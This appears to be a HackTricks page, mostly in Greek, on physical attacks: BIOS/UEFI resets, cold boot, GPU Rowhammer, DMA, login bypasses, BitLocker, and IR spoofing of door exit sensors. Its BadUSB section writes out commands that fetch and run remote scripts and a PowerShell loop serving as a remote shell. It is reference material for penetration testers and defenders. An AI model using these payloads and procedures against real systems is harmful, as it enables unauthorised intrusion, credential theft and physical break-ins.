# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## Ανάκτηση Κωδικού BIOS και Ασφάλεια Συστήματος

Το **Resetting the BIOS** μπορεί να επιτευχθεί με διάφορους τρόπους. Οι περισσότερες μητρικές πλακέτες περιλαμβάνουν μια **battery** που, όταν αφαιρεθεί για περίπου **30 minutes**, θα κάνει reset τις ρυθμίσεις του BIOS, συμπεριλαμβανομένου του password. Εναλλακτικά, ένα **jumper on the motherboard** μπορεί να ρυθμιστεί ώστε να γίνει reset αυτών των ρυθμίσεων με τη σύνδεση συγκεκριμένων pins.

Για περιπτώσεις όπου οι αλλαγές στο hardware δεν είναι δυνατές ή πρακτικές, τα **software tools** προσφέρουν μια λύση. Η εκτέλεση ενός συστήματος από ένα **Live CD/USB** με distributions όπως το **Kali Linux** παρέχει πρόσβαση σε tools όπως τα **_killCmos_** και **_CmosPWD_**, τα οποία μπορούν να βοηθήσουν στην ανάκτηση του BIOS password.

Σε περιπτώσεις όπου το BIOS password είναι άγνωστο, η λανθασμένη εισαγωγή του **three times** συνήθως θα οδηγήσει σε ένα error code. Αυτός ο κωδικός μπορεί να χρησιμοποιηθεί σε websites όπως το [https://bios-pw.org](https://bios-pw.org) για να ανακτηθεί ενδεχομένως ένα usable password.

### UEFI Security

Για σύγχρονα συστήματα που χρησιμοποιούν **UEFI** αντί για το παραδοσιακό BIOS, το tool **chipsec** μπορεί να χρησιμοποιηθεί για την ανάλυση και τροποποίηση ρυθμίσεων UEFI, συμπεριλαμβανομένης της απενεργοποίησης του **Secure Boot**. Αυτό μπορεί να επιτευχθεί με την ακόλουθη command:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Ανάλυση RAM και Επιθέσεις Cold Boot

Η RAM διατηρεί δεδομένα για λίγο μετά την απενεργοποίηση, συνήθως για **1 έως 2 λεπτά**. Αυτή η επιμονή μπορεί να επεκταθεί έως **10 λεπτά** εφαρμόζοντας ψυχρές ουσίες, όπως υγρό άζωτο. Κατά τη διάρκεια αυτής της παρατεταμένης περιόδου, μπορεί να δημιουργηθεί ένα **memory dump** με εργαλεία όπως **dd.exe** και **volatility** για ανάλυση.

---

## GPU Rowhammer Εναντίον Page Tables

Οι σύγχρονες επιθέσεις GPU Rowhammer γίνονται πολύ πιο χρήσιμες όταν στοχεύουν τα **GPU virtual-memory metadata** αντί για συνηθισμένα buffers. Πρόσφατη εργασία σε **GDDR6 NVIDIA Ampere GPUs** δείχνει ότι ένας επιτιθέμενος που τρέχει unprivileged CUDA code μπορεί να δημιουργήσει GPU-specific hammering patterns, να χρησιμοποιήσει **memory massaging** για να τοποθετήσει paging structures σε ευάλωτες rows, και στη συνέχεια να κάνει flip bits στο **last-level page table** ή σε ένα ενδιάμεσο **page directory**. Μόλις καταστραφεί μία μόνο translation entry, ο επιτιθέμενος μπορεί να bootstrap **arbitrary GPU memory read/write** και στη συνέχεια να pivot σε compromise του host.

### Μοτίβο Εκμετάλλευσης

1. **Profile hammerable rows** σε GDDR6 και δημιούργησε refresh-aware / non-uniform hammering patterns που παρακάμπτουν in-DRAM mitigations.
2. **Massage GPU allocations** ώστε το driver να τοποθετήσει page-translation structures σε hammerable physical locations αντί να τις κρατά στο προεπιλεγμένο protected pool. Στην πράξη αυτό μπορεί να σημαίνει εξάντληση της low-memory page-table region και spraying μεγάλων sparse UVM mappings με controlled strides.
3. **Flip translation metadata** όπως **PFN** ή aperture-related bits μέσα σε ένα page-table / page-directory entry ώστε η attacker-controlled virtual page να επιλύεται σε page-table pages, arbitrary GPU memory, ή host-visible system mappings.
4. Επανεγκατάστησε το forged mapping για να ξαναγράψεις πρόσθετες translation entries και να κλιμακώσεις σε **arbitrary GPU memory read/write** across GPU contexts.

### Pivot στο Host και Mitigations

- Με **IOMMU disabled**, forged system-aperture mappings μπορούν να εκθέσουν arbitrary **host physical memory** στο GPU, μετατρέποντας το GPU primitive σε πλήρες host compromise.
- Το **GDDRHammer** στοχεύει last-level page-table entries, ενώ το **GeForge** δείχνει ότι η καταστροφή ενός page-directory level μπορεί να είναι ευκολότερη επειδή ένα bit flip μπορεί να ανακατευθύνει ένα μεγαλύτερο translation subtree. Μην θεωρείς μόνο ένα paging layer ως security-critical.
- Το **IOMMU** εξακολουθεί να έχει σημασία επειδή μπλοκάρει την άμεση arbitrary-host-memory διαδρομή που χρησιμοποιείται από GDDRHammer/GeForge, αλλά **δεν αποτελεί πλήρη mitigation**. Το **GPUBreach** δείχνει ένα second-stage pivot όπου ο επιτιθέμενος καταστρέφει GPU-writable, driver-owned CPU buffers και στη συνέχεια ενεργοποιεί NVIDIA driver memory-safety bugs για να αποκτήσει kernel write primitive και ένα **root shell** ακόμη και με ενεργό IOMMU.
- Το **System-level ECC** είναι ένα πρακτικό hardening step σε υποστηριζόμενα workstation/server GPUs. Consumer GPUs χωρίς ECC εκθέτουν πιο αδύναμη surface άμυνας.
- Αυτές οι επιθέσεις δεν είναι καθαρά θεωρητικές: το **GeForge** ανέφερε **1,171** bit flips σε ένα RTX 3060 και **202** σε ένα RTX A6000, αρκετά για να χτιστεί μια λειτουργική αλυσίδα host-privilege-escalation.

---

## Επιθέσεις Direct Memory Access (DMA)

Το **INCEPTION** είναι ένα εργαλείο σχεδιασμένο για **physical memory manipulation** μέσω DMA, συμβατό με interfaces όπως **FireWire** και **Thunderbolt**. Επιτρέπει το bypass των διαδικασιών login με patching της μνήμης ώστε να δέχεται οποιονδήποτε password. Ωστόσο, είναι αναποτελεσματικό απέναντι σε συστήματα **Windows 10**.

---

## Live CD/USB για Πρόσβαση στο Σύστημα

Η αντικατάσταση system binaries όπως τα **_sethc.exe_** ή **_Utilman.exe_** με ένα αντίγραφο του **_cmd.exe_** μπορεί να δώσει command prompt με system privileges. Εργαλεία όπως το **chntpw** μπορούν να χρησιμοποιηθούν για την επεξεργασία του αρχείου **SAM** μιας εγκατάστασης Windows, επιτρέποντας αλλαγές password.

Το **Kon-Boot** είναι ένα εργαλείο που διευκολύνει το login σε συστήματα Windows χωρίς να γνωρίζεις το password, τροποποιώντας προσωρινά το Windows kernel ή το UEFI. Περισσότερες πληροφορίες μπορούν να βρεθούν στο [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Διαχείριση Windows Security Features

### Συντομεύσεις Boot και Recovery

- **Supr**: Πρόσβαση στις ρυθμίσεις BIOS.
- **F8**: Είσοδος σε Recovery mode.
- Πατώντας **Shift** μετά το Windows banner μπορεί να παρακαμφθεί το autologon.

### BAD USB Devices

Συσκευές όπως τα **Rubber Ducky** και **Teensyduino** λειτουργούν ως πλατφόρμες για τη δημιουργία **bad USB** devices, ικανών να εκτελούν προκαθορισμένα payloads όταν συνδέονται σε έναν στόχο υπολογιστή.

### Volume Shadow Copy

Τα δικαιώματα administrator επιτρέπουν τη δημιουργία αντιγράφων ευαίσθητων αρχείων, συμπεριλαμβανομένου του αρχείου **SAM**, μέσω PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Implants βασισμένα σε ESP32-S3, όπως το **Evil Crow Cable Wind**, κρύβονται μέσα σε USB-A→USB-C ή USB-C↔USB-C καλώδια, εμφανίζονται αποκλειστικά ως USB keyboard και εκθέτουν το C2 stack τους μέσω Wi-Fi. Ο operator χρειάζεται μόνο να τροφοδοτήσει το καλώδιο από το θύμα host, να δημιουργήσει ένα hotspot με όνομα `Evil Crow Cable Wind` και password `123456789`, και να ανοίξει το [http://cable-wind.local/](http://cable-wind.local/) (ή τη DHCP address του) για να φτάσει στο embedded HTTP interface.
- Το browser UI παρέχει tabs για *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, και *Config*. Τα stored payloads επισημαίνονται ανά OS, τα keyboard layouts αλλάζουν on the fly, και τα VID/PID strings μπορούν να τροποποιηθούν ώστε να μιμούνται γνωστά peripherals.
- Επειδή το C2 ζει μέσα στο καλώδιο, ένα phone μπορεί να stage payloads, να ενεργοποιήσει την εκτέλεση και να διαχειριστεί Wi-Fi credentials χωρίς να αγγίξει το host OS—ιδανικό για σύντομες physical intrusions.

### OS-aware AutoExec payloads

- Οι AutoExec rules δένουν ένα ή περισσότερα payloads ώστε να ενεργοποιηθούν αμέσως μετά το USB enumeration. Το implant κάνει ελαφρύ OS fingerprinting και επιλέγει το αντίστοιχο script.
- Παράδειγμα workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ή `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Επειδή η εκτέλεση γίνεται unattended, η απλή αντικατάσταση ενός charging cable μπορεί να επιτύχει αρχική πρόσβαση “plug-and-pwn” υπό το context του logged-on user.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Ένα stored payload ανοίγει μια console και επικολλά ένα loop που εκτελεί ό,τι φτάνει στη νέα USB serial device. Μια ελάχιστη Windows variant είναι:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Το implant διατηρεί ανοιχτό το κανάλι USB CDC ενώ το ESP32-S3 του εκκινεί έναν TCP client (Python script, Android APK, ή desktop executable) πίσω προς τον operator. Οποιαδήποτε bytes πληκτρολογηθούν στο TCP session προωθούνται στο serial loop παραπάνω, δίνοντας remote command execution ακόμα και σε air-gapped hosts. Το output είναι περιορισμένο, οπότε οι operators συνήθως τρέχουν blind commands (account creation, staging additional tooling, etc.).

### HTTP OTA update surface

- Το ίδιο web stack συνήθως εκθέτει unauthenticated firmware updates. Το Evil Crow Cable Wind ακούει στο `/update` και κάνει flash όποιο binary ανέβει:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Οι field operators μπορούν να κάνουν hot-swap features (π.χ. flash USB Army Knife firmware) mid-engagement χωρίς να ανοίξουν το cable, επιτρέποντας στο implant να pivot to new capabilities ενώ παραμένει συνδεδεμένο στο target host.

## Παράκαμψη BitLocker Encryption

Το BitLocker encryption μπορεί δυνητικά να παρακαμφθεί αν ο **recovery password** βρεθεί μέσα σε αρχείο memory dump (**MEMORY.DMP**). Εργαλεία όπως **Elcomsoft Forensic Disk Decryptor** ή **Passware Kit Forensic** μπορούν να χρησιμοποιηθούν για αυτόν τον σκοπό.

---

## Social Engineering για Προσθήκη Recovery Key

Ένα νέο BitLocker recovery key μπορεί να προστεθεί μέσω social engineering tactics, πείθοντας έναν user να εκτελέσει μια command που προσθέτει ένα νέο recovery key αποτελούμενο από μηδενικά, απλοποιώντας έτσι τη διαδικασία decryption.

---

## Εκμετάλλευση Chassis Intrusion / Maintenance Switches για Factory-Reset του BIOS

Πολλά σύγχρονα laptops και small-form-factor desktops περιλαμβάνουν ένα **chassis-intrusion switch** που παρακολουθείται από το Embedded Controller (EC) και το BIOS/UEFI firmware. Παρότι ο κύριος σκοπός του switch είναι να ενεργοποιεί μια alert όταν ένα device ανοίγει, οι vendors μερικές φορές υλοποιούν ένα **undocumented recovery shortcut** που ενεργοποιείται όταν το switch αλλάζει με συγκεκριμένο pattern.

### Πώς Λειτουργεί η Attack

1. Το switch είναι συνδεδεμένο σε ένα **GPIO interrupt** στον EC.
2. Firmware που τρέχει στον EC παρακολουθεί το **timing και το number of presses**.
3. Όταν αναγνωριστεί ένα hard-coded pattern, ο EC καλεί μια *mainboard-reset* routine που **σβήνει τα contents του system NVRAM/CMOS**.
4. Στο επόμενο boot, το BIOS φορτώνει default values – **supervisor password, Secure Boot keys, και όλη η custom configuration διαγράφονται**.

> Μόλις το Secure Boot απενεργοποιηθεί και το firmware password χαθεί, ο attacker μπορεί απλώς να κάνει boot οποιοδήποτε external OS image και να αποκτήσει unrestricted access στους internal drives.

### Real-World Example – Framework 13 Laptop

Το recovery shortcut για το Framework 13 (11th/12th/13th-gen) είναι:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Μετά τον δέκατο κύκλο το EC θέτει ένα flag που δίνει εντολή στο BIOS να σβήσει το NVRAM στο επόμενο reboot. Όλη η διαδικασία διαρκεί ~40 s και απαιτεί **τίποτα άλλο πέρα από ένα κατσαβίδι**.

### Generic Exploitation Procedure

1. Power-on or suspend-resume το target ώστε το EC να εκτελείται.
2. Αφαίρεσε το κάτω κάλυμμα για να αποκαλυφθεί ο intrusion/maintenance switch.
3. Αναπαρήγαγε το vendor-specific toggle pattern (συμβουλέψου documentation, forums ή κάνε reverse-engineer το EC firmware).
4. Επανασυναρμολόγησε και κάνε reboot – τα firmware protections θα πρέπει να είναι disabled.
5. Boot ένα live USB (π.χ. Kali Linux) και εκτέλεσε το συνήθες post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Detection & Mitigation

* Κατέγραψε τα chassis-intrusion events στο OS management console και κάνε correlation με unexpected BIOS resets.
* Εφάρμοσε **tamper-evident seals** σε screws/covers για να ανιχνεύεις το άνοιγμα.
* Κράτα τις συσκευές σε **physically controlled areas**· θεώρησε ότι το physical access ισοδυναμεί με full compromise.
* Όπου είναι διαθέσιμο, απενεργοποίησε το vendor “maintenance switch reset” feature ή απαίτησε πρόσθετη κρυπτογραφική authorisation για NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Τα commodity “wave-to-exit” sensors συνδυάζουν έναν near-IR LED emitter με ένα TV-remote style receiver module που αναφέρει logic high μόνο αφού δει πολλαπλά pulses (~4–10) του σωστού carrier (≈30 kHz).
- Ένα plastic shroud μπλοκάρει τον emitter και τον receiver ώστε να μην κοιτάζουν απευθείας ο ένας τον άλλον, άρα ο controller υποθέτει ότι οποιοδήποτε validated carrier προήλθε από κοντινή reflection και ενεργοποιεί ένα relay που ανοίγει το door strike.
- Μόλις ο controller πιστέψει ότι υπάρχει target συχνά αλλάζει το outbound modulation envelope, αλλά ο receiver συνεχίζει να δέχεται οποιοδήποτε burst ταιριάζει με το filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – σύνδεσε ένα logic analyser πάνω στα controller pins για να καταγράψεις τόσο τα pre-detection όσο και τα post-detection waveforms που οδηγούν το εσωτερικό IR LED.
2. **Replay only the “post-detection” waveform** – αφαίρεσε/αγνόησε το stock emitter και οδήγησε ένα external IR LED με το ήδη-triggered pattern από την αρχή. Επειδή ο receiver ενδιαφέρεται μόνο για pulse count/frequency, αντιμετωπίζει το spoofed carrier ως γνήσια reflection και ενεργοποιεί τη relay line.
3. **Gate the transmission** – μετάδωσε το carrier σε tuned bursts (π.χ. δεκάδες milliseconds on, παρόμοια off) για να δώσεις το ελάχιστο pulse count χωρίς να κορεστεί η AGC του receiver ή η interference handling logic. Η συνεχής εκπομπή αποευαισθητοποιεί γρήγορα τον sensor και σταματά να ενεργοποιείται το relay.

### Long-Range Reflective Injection
- Η αντικατάσταση του bench LED με high-power IR diode, MOSFET driver και focusing optics επιτρέπει αξιόπιστο triggering από απόσταση ~6 m.
- Ο attacker δεν χρειάζεται line-of-sight προς το receiver aperture· στοχεύοντας τη δέσμη σε εσωτερικούς τοίχους, ράφια ή door frames που φαίνονται μέσα από γυαλί, η ανακλώμενη ενέργεια μπαίνει στο ~30° field of view και μιμείται χειρονομία κοντινής απόστασης.
- Επειδή οι receivers περιμένουν μόνο ασθενείς reflections, μια πολύ ισχυρότερη εξωτερική δέσμη μπορεί να αναπηδήσει σε πολλαπλές επιφάνειες και να παραμείνει πάνω από το detection threshold.

### Weaponised Attack Torch
- Η ενσωμάτωση του driver μέσα σε commercial flashlight κρύβει το tool σε κοινή θέα. Αντάλλαξε το ορατό LED με ένα high-power IR LED προσαρμοσμένο στη ζώνη του receiver, πρόσθεσε ένα ATtiny412 (ή παρόμοιο) για να παράγει τα ≈30 kHz bursts και χρησιμοποίησε ένα MOSFET για να sink the LED current.
- Ένας telescopic zoom lens στενεύει τη δέσμη για range/precision, ενώ ένας vibration motor υπό έλεγχο MCU δίνει haptic confirmation ότι η modulation είναι ενεργή χωρίς να εκπέμπεται ορατό φως.
- Η εναλλαγή μεταξύ αρκετών αποθηκευμένων modulation patterns (ελαφρώς διαφορετικές carrier frequencies και envelopes) αυξάνει τη συμβατότητα μεταξύ rebranded sensor families, επιτρέποντας στον operator να σαρώσει reflective surfaces μέχρι το relay να κάνει audible click και η πόρτα να απελευθερωθεί.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
